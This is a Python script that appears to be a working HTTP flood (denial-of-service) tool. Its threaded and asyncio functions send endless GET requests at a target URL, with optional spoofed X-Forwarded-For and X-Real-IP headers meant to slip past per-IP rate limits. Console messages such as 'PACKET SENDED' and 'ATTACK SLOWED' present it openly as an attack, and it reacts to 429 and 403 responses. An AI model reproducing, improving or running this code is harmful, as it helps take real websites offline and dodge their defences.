import requests
import time
import threading
import random
from colorama import Fore, Style, init
import aiohttp
import asyncio

init()

def create_fake_ip():
    return f"192.168.{random.randint(0,255)}.{random.randint(1,254)}"

def check_status_and_print(status_code, url, history=None):
    if status_code == 429:
        print(Style.RESET_ALL + "DEBUG: ATTACK SLOWED (code 429)" + Style.RESET_ALL)
        return "sleep"
    elif status_code == 404:
        print(Fore.RED + "<--------PACKET NOT SENT (404 error)-------->" + Style.RESET_ALL)
    elif status_code==302 or status_code==303:
        print(Fore.CYAN + "<--------THE ATTACK WAS STOPPED FOR YOUR OWN GOOD.-------->" + Style.RESET_ALL)
        if history:
            print(f"THE SITE THAT THE SACRIFICE SITE REDIRECTED TO\nTARGET SITE: {url}")
            for redirected_site in history:
                site_url = getattr(redirected_site, 'url', redirected_site)
                site_status = getattr(redirected_site, 'status', getattr(redirected_site, 'status_code', '3xx'))
                print(f"-> {site_url} status code {site_status}")
        return "break"
    elif status_code == 403:
        print(Fore.RED + "<--------PACKET NOT SENT (403 WAF BLOCKED)-------->" + Style.RESET_ALL)
        return "break"
    else:
        print(Fore.GREEN + "<-------PACKET SENDED------->" + Style.RESET_ALL)
    return "continue"

def S_Method_request(url, use_fake_ip=False):
    while True:
        try:
            headers = {}
            if use_fake_ip:
                fake_ip = create_fake_ip()
                headers = {"X-Forwarded-For": fake_ip, "X-Real-IP": fake_ip}
                
            response = requests.get(url, headers=headers, allow_redirects=True, timeout=5)
            result = check_status_and_print(response.status_code, url, response.history)
            
            if result == "sleep":
                time.sleep(1)
            elif result == "break":
                break
        except Exception:
            print(Fore.RED + "ATTACK STOPPED (Connection Error)" + Style.RESET_ALL)
            break

def S_Method(URL, thread_count=1):
    if thread_count is None or thread_count < 1:
        thread_count = 1
    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=S_Method_request, args=(URL, False))
        threads.append(t)
        t.start()

def S_Method_ru(URL, thread_count=1):
    if thread_count is None or thread_count < 1:
        thread_count = 1
    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=S_Method_request, args=(URL, True))
        threads.append(t)
        t.start()

async def A_Method_task(session, url, use_fake_ip=False):
    while True:
        try:
            headers = {}
            if use_fake_ip:
                fake_ip = create_fake_ip()
                headers = {"X-Forwarded-For": fake_ip, "X-Real-IP": fake_ip}

            async with session.get(url, headers=headers, allow_redirects=True, timeout=5) as response:
                result = check_status_and_print(response.status, url, response.history)
                
                if result == "sleep":
                    await asyncio.sleep(1)
                elif result == "break":
                    break
        except Exception:
            print(Fore.RED + "ASYNC ATTACK STOPPED" + Style.RESET_ALL)
            break

async def A_Method_Runner(URL, task_count, use_fake_ip=False):
    connector = aiohttp.TCPConnector(limit=task_count)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for _ in range(task_count):
            task = asyncio.create_task(A_Method_task(session, URL, use_fake_ip))
            tasks.append(task)
        await asyncio.gather(*tasks)

def A_Method(URL, thread_count=1):
    if thread_count is None or thread_count < 1:
        thread_count = 1
    asyncio.run(A_Method_Runner(URL, thread_count, False))

def A_Method_ru(URL, thread_count=1):
    if thread_count is None or thread_count < 1:
        thread_count = 1
    asyncio.run(A_Method_Runner(URL, thread_count, True))
